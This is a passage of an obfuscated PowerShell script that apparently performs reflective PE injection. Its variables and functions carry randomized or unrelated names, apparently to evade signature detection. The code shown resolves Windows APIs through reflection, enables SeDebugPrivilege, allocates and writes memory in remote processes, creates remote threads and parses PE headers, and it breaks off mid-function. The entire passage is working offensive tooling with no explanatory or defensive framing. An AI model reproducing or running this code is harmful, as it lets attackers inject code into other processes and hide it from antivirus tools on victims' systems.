        $XUZcqruG99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bbiCasQD99, $glCFpLoD99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name VirtualAlloc -Value $XUZcqruG99

        $VseFSQBP99 = gargled kernel32.dll VirtualAllocEx
        $QVfyOLRA99 = reallocated @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $GhgPkkqA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VseFSQBP99, $QVfyOLRA99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $GhgPkkqA99

        $JQerLuWQ99 = gargled msvcrt.dll memcpy
        $guEXqJwS99 = reallocated @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $PMvAAimb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JQerLuWQ99, $guEXqJwS99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $PMvAAimb99

        $cFKelaHK99 = gargled msvcrt.dll memset
        $dzaTqiio99 = reallocated @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $NuIFISnY99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cFKelaHK99, $dzaTqiio99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name memset -Value $NuIFISnY99

        $FKeMEtQy99 = gargled kernel32.dll LoadLibraryA
        $xEPGSTor99 = reallocated @([String]) ([IntPtr])
        $CnZwOlfA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FKeMEtQy99, $xEPGSTor99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $CnZwOlfA99

        $TRRQNeGN99 = gargled kernel32.dll GetProcAddress
        $LfxfaEHq99 = reallocated @([IntPtr], [String]) ([IntPtr])
        $dpIGcqmc99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TRRQNeGN99, $LfxfaEHq99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $dpIGcqmc99

        $JImUEdmR99 = gargled kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $jfiAhUpq99 = reallocated @([IntPtr], [IntPtr]) ([IntPtr])
        $SLBPYimM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JImUEdmR99, $jfiAhUpq99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $SLBPYimM99

        $iGQZnSEJ99 = gargled kernel32.dll VirtualFree
        $DqYIbymV99 = reallocated @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $nYxDNtjb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iGQZnSEJ99, $DqYIbymV99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name VirtualFree -Value $nYxDNtjb99

        $lQjtlagF99 = gargled kernel32.dll VirtualFreeEx
        $HUGIajOw99 = reallocated @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $sCRcLhnq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lQjtlagF99, $HUGIajOw99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $sCRcLhnq99

        $oQhLVEDT99 = gargled kernel32.dll VirtualProtect
        $wZUUpHsn99 = reallocated @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $odcQKIiN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($oQhLVEDT99, $wZUUpHsn99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name VirtualProtect -Value $odcQKIiN99

        $IcLxZYgJ99 = gargled kernel32.dll GetModuleHandleA
        $yJIboVYy99 = reallocated @([String]) ([IntPtr])
        $JTyrFbCw99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IcLxZYgJ99, $yJIboVYy99)
        $EeGdRnzz99 | Add-Member NoteProperty -Name GetModuleHandle -Value $JTyrFbCw99

        $AeDFiKUu99 = gargled kernel32.dll FreeLibrary
        $DZXlvmIl99 = reallocated @([IntPtr]) ([Bool])
        $KehCIcrC99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AeDFiKUu99, $DZXlvmIl99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $KehCIcrC99

        $xOIHYDcu99 = gargled kernel32.dll OpenProcess
        $TSgimInR99 = reallocated @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $eGyGEhAG99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xOIHYDcu99, $TSgimInR99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $eGyGEhAG99

        $vAIXHMDt99 = gargled kernel32.dll WaitForSingleObject
        $ZTWTqDLh99 = reallocated @([IntPtr], [UInt32]) ([UInt32])
        $cxkXzVoD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAIXHMDt99, $ZTWTqDLh99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $cxkXzVoD99

        $qiIqWPQa99 = gargled kernel32.dll WriteProcessMemory
        $QuaNITgA99 = reallocated @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $Ydbnsbwt99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qiIqWPQa99, $QuaNITgA99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $Ydbnsbwt99

        $bYRzoSzG99 = gargled kernel32.dll ReadProcessMemory
        $wenROUpp99 = reallocated @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $rULstDVq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bYRzoSzG99, $wenROUpp99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $rULstDVq99

        $VWsnrLzo99 = gargled kernel32.dll CreateRemoteThread
        $ZZAlyBOE99 = reallocated @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $NGZUoNBE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VWsnrLzo99, $ZZAlyBOE99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $NGZUoNBE99

        $XjgeLLpH99 = gargled kernel32.dll GetExitCodeThread
        $wQVDYiGh99 = reallocated @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $cmHXYoDh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XjgeLLpH99, $wQVDYiGh99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $cmHXYoDh99

        $TyzDEUmL99 = gargled Advapi32.dll OpenThreadToken
        $wqyzUnHK99 = reallocated @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $cGUbyvuy99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TyzDEUmL99, $wqyzUnHK99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $cGUbyvuy99

        $EyOqXGEV99 = gargled kernel32.dll GetCurrentThread
        $MhVRFXcv99 = reallocated @() ([IntPtr])
        $OfPasftf99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EyOqXGEV99, $MhVRFXcv99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $OfPasftf99

        $xVcvNSHb99 = gargled Advapi32.dll AdjustTokenPrivileges
        $WwYdPaFw99 = reallocated @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $NhpVONBu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xVcvNSHb99, $WwYdPaFw99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $NhpVONBu99

        $PGLWItKF99 = gargled Advapi32.dll LookupPrivilegeValueA
        $FCVVQqQV99 = reallocated @([String], [String], [IntPtr]) ([Bool])
        $USRBxSEP99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PGLWItKF99, $FCVVQqQV99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $USRBxSEP99

        $cWKYzqCz99 = gargled Advapi32.dll ImpersonateSelf
        $MiskWqga99 = reallocated @([Int32]) ([Bool])
        $KmgOXOdu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cWKYzqCz99, $MiskWqga99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $KmgOXOdu99

        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $xmCTNXUP99 = gargled NtDll.dll NtCreateThreadEx
            $zFztNNMK99 = reallocated @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $cYwtFbIf99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xmCTNXUP99, $zFztNNMK99)
            $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $cYwtFbIf99
        }

        $UHvMMxsn99 = gargled Kernel32.dll IsWow64Process
        $sirXdugL99 = reallocated @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $zMiiFMyM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UHvMMxsn99, $sirXdugL99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $zMiiFMyM99

        $xnFgpHta99 = gargled Kernel32.dll CreateThread
        $vjKOHhCD99 = reallocated @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $rpSsgmpM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xnFgpHta99, $vjKOHhCD99)
        $EeGdRnzz99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $rpSsgmpM99

        return $EeGdRnzz99
    }



    Function remarkably
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $eiiWlaEP99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $FMCZdxfs99
        )

        [Byte[]]$imLdWejc99 = [BitConverter]::GetBytes($eiiWlaEP99)
        [Byte[]]$vczVtrKx99 = [BitConverter]::GetBytes($FMCZdxfs99)
        [Byte[]]$OwNVrWjg99 = [BitConverter]::GetBytes([UInt64]0)

        if ($imLdWejc99.Count -eq $vczVtrKx99.Count)
        {
            $HQxtZYhb99 = 0
            for ($i = 0; $i -lt $imLdWejc99.Count; $i++)
            {
                $Val = $imLdWejc99[$i] - $HQxtZYhb99
                if ($Val -lt $vczVtrKx99[$i])
                {
                    $Val += 256
                    $HQxtZYhb99 = 1
                }
                else
                {
                    $HQxtZYhb99 = 0
                }

                [UInt16]$Sum = $Val - $vczVtrKx99[$i]

                $OwNVrWjg99[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($OwNVrWjg99, 0)
    }

    Function unkind
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $eiiWlaEP99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $FMCZdxfs99
        )

        [Byte[]]$imLdWejc99 = [BitConverter]::GetBytes($eiiWlaEP99)
        [Byte[]]$vczVtrKx99 = [BitConverter]::GetBytes($FMCZdxfs99)
        [Byte[]]$OwNVrWjg99 = [BitConverter]::GetBytes([UInt64]0)

        if ($imLdWejc99.Count -eq $vczVtrKx99.Count)
        {
            $HQxtZYhb99 = 0
            for ($i = 0; $i -lt $imLdWejc99.Count; $i++)
            {
                [UInt16]$Sum = $imLdWejc99[$i] + $vczVtrKx99[$i] + $HQxtZYhb99

                $OwNVrWjg99[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $HQxtZYhb99 = 1
                }
                else
                {
                    $HQxtZYhb99 = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($OwNVrWjg99, 0)
    }

    Function dissecting
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $eiiWlaEP99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $FMCZdxfs99
        )

        [Byte[]]$imLdWejc99 = [BitConverter]::GetBytes($eiiWlaEP99)
        [Byte[]]$vczVtrKx99 = [BitConverter]::GetBytes($FMCZdxfs99)

        if ($imLdWejc99.Count -eq $vczVtrKx99.Count)
        {
            for ($i = $imLdWejc99.Count-1; $i -ge 0; $i--)
            {
                if ($imLdWejc99[$i] -gt $vczVtrKx99[$i])
                {
                    return $true
                }
                elseif ($imLdWejc99[$i] -lt $vczVtrKx99[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function levy
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$LTuCQUFA99 = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($LTuCQUFA99, 0))
    }


    Function overheating
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $NGsKAQay99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($NGsKAQay99)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function ferment
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $NPrHmsgo99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$uLDsXBon99 = [IntPtr](unkind ($StartAddress) ($Size))

        $pWbDFlBH99 = $PEInfo.EndAddress

        if ((dissecting ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $NPrHmsgo99"
        }
        if ((dissecting ($uLDsXBon99) ($pWbDFlBH99)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $NPrHmsgo99"
        }
    }

    Function boogie
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $ynTERLem99
        )

        for ($FaXICIrt99 = 0; $FaXICIrt99 -lt $Bytes.Length; $FaXICIrt99++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($ynTERLem99, $FaXICIrt99, $Bytes[$FaXICIrt99])
        }
    }

    Function reallocated
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $mOsryqhC99 = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $wLiEEUKd99 = [AppDomain]::CurrentDomain
        $KflSoEBr99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $GpzLCYQv99 = $wLiEEUKd99.DefineDynamicAssembly($KflSoEBr99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $pImZUhzV99 = $GpzLCYQv99.DefineDynamicModule('InMemoryModule', $false)
        $MirWLJWO99 = $pImZUhzV99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $UkbKNsQm99 = $MirWLJWO99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mOsryqhC99)
        $UkbKNsQm99.SetImplementationFlags('Runtime, Managed')
        $ZppCjHrK99 = $MirWLJWO99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $mOsryqhC99)
        $ZppCjHrK99.SetImplementationFlags('Runtime, Managed')

        Write-Output $MirWLJWO99.CreateType()
    }


    Function gargled
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $WYZvvesp99
        )

        $AxtJRzcg99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $ldLfCiTi99 = $AxtJRzcg99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $JTyrFbCw99 = $ldLfCiTi99.GetMethod('GetModuleHandle')
        #$dpIGcqmc99 = $ldLfCiTi99.GetMethod('GetProcAddress')
        $dpIGcqmc99 = $ldLfCiTi99.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        $UVcqnBRq99 = $JTyrFbCw99.Invoke($null, @($Module))
        $JuDLfCVT99 = New-Object IntPtr
        $yIjvRQVJ99 = New-Object System.Runtime.InteropServices.HandleRef($JuDLfCVT99, $UVcqnBRq99)

        Write-Output $dpIGcqmc99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$yIjvRQVJ99, $WYZvvesp99))
    }

    Function combustible
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$MfuWFOdx99 = $EeGdRnzz99.GetCurrentThread.Invoke()
        if ($MfuWFOdx99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$jxaYDkBO99 = [IntPtr]::Zero
        [Bool]$adFraWRE99 = $EeGdRnzz99.OpenThreadToken.Invoke($MfuWFOdx99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$jxaYDkBO99)
        if ($adFraWRE99 -eq $false)
        {
            $LQkVhMrj99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($LQkVhMrj99 -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $adFraWRE99 = $EeGdRnzz99.ImpersonateSelf.Invoke(3)
                if ($adFraWRE99 -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $adFraWRE99 = $EeGdRnzz99.OpenThreadToken.Invoke($MfuWFOdx99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$jxaYDkBO99)
                if ($adFraWRE99 -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $LQkVhMrj99"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.LUID))
        $adFraWRE99 = $EeGdRnzz99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($adFraWRE99 -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$fPDEBwhg99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.TOKEN_PRIVILEGES)
        [IntPtr]$gkwrgqwu99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($fPDEBwhg99)
        $eBgQMsrN99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($gkwrgqwu99, [Type]$rksQRGqN99.TOKEN_PRIVILEGES)
        $eBgQMsrN99.PrivilegeCount = 1
        $eBgQMsrN99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$rksQRGqN99.LUID)
        $eBgQMsrN99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($eBgQMsrN99, $gkwrgqwu99, $true)

        $adFraWRE99 = $EeGdRnzz99.AdjustTokenPrivileges.Invoke($jxaYDkBO99, $false, $gkwrgqwu99, $fPDEBwhg99, [IntPtr]::Zero, [IntPtr]::Zero)
        $LQkVhMrj99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($adFraWRE99 -eq $false) -or ($LQkVhMrj99 -ne 0))
        {
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($gkwrgqwu99)
    }

    Function muffling
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $zzlkUotp99,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $AkLUHxrK99 = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99
        )

        [IntPtr]$YEyADQYt99 = [IntPtr]::Zero

        $PszJNzIY99 = [Environment]::OSVersion.Version
        if (($PszJNzIY99 -ge (New-Object 'Version' 6,0)) -and ($PszJNzIY99 -lt (New-Object 'Version' 6,2)))
        {
            $dXMhiXKR99= $EeGdRnzz99.NtCreateThreadEx.Invoke([Ref]$YEyADQYt99, 0x1FFFFF, [IntPtr]::Zero, $zzlkUotp99, $StartAddress, $AkLUHxrK99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $aHMDwTjZ99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($YEyADQYt99 -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $dXMhiXKR99. LastError: $aHMDwTjZ99"
            }
        }
        else
        {
            $YEyADQYt99 = $EeGdRnzz99.CreateRemoteThread.Invoke($zzlkUotp99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $AkLUHxrK99, 0, [IntPtr]::Zero)
        }

        if ($YEyADQYt99 -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $YEyADQYt99
    }

    Function bursar
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $RIYjzmtQ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99
        )

        $oZsJzmYW99 = New-Object System.Object

        $mcfqbbVV99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RIYjzmtQ99, [Type]$rksQRGqN99.IMAGE_DOS_HEADER)

        [IntPtr]$IDkGQHCM99 = [IntPtr](unkind ([Int64]$RIYjzmtQ99) ([Int64][UInt64]$mcfqbbVV99.e_lfanew))
        $oZsJzmYW99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $IDkGQHCM99
        $xbMKQMFu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IDkGQHCM99, [Type]$rksQRGqN99.IMAGE_NT_HEADERS64)

        if ($xbMKQMFu99.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($xbMKQMFu99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $oZsJzmYW99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $xbMKQMFu99
            $oZsJzmYW99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $YzQkfHff99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IDkGQHCM99, [Type]$rksQRGqN99.IMAGE_NT_HEADERS32)
            $oZsJzmYW99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $YzQkfHff99
            $oZsJzmYW99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $oZsJzmYW99
    }


    Function quadricepses
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $cprRzWpK99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99
        )

        $PEInfo = New-Object System.Object

        [IntPtr]$lFWoiOEn99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cprRzWpK99.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($cprRzWpK99, 0, $lFWoiOEn99, $cprRzWpK99.Length) | Out-Null

        $oZsJzmYW99 = bursar -RIYjzmtQ99 $lFWoiOEn99 -rksQRGqN99 $rksQRGqN99

        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($oZsJzmYW99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($oZsJzmYW99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($oZsJzmYW99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($oZsJzmYW99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($oZsJzmYW99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lFWoiOEn99)

        return $PEInfo
    }


    Function amassing
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $RIYjzmtQ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($RIYjzmtQ99 -eq $null -or $RIYjzmtQ99 -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        $oZsJzmYW99 = bursar -RIYjzmtQ99 $RIYjzmtQ99 -rksQRGqN99 $rksQRGqN99

        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $RIYjzmtQ99
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($oZsJzmYW99.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($oZsJzmYW99.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($oZsJzmYW99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($oZsJzmYW99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$NkqCGpMd99 = [IntPtr](unkind ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NkqCGpMd99
        }
        else
        {
            [IntPtr]$NkqCGpMd99 = [IntPtr](unkind ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NkqCGpMd99
        }

        if (($oZsJzmYW99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($oZsJzmYW99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function intestate
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $HrCwxdne99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $eICoouhl99
        )

        $WqGHXyIC99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $XYhTkdpp99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($eICoouhl99)
        $mrZjKzuu99 = [UIntPtr][UInt64]([UInt64]$XYhTkdpp99.Length + 1)
        $tGJwkBNo99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, $mrZjKzuu99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($tGJwkBNo99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$TAuMVxYU99 = [UIntPtr]::Zero
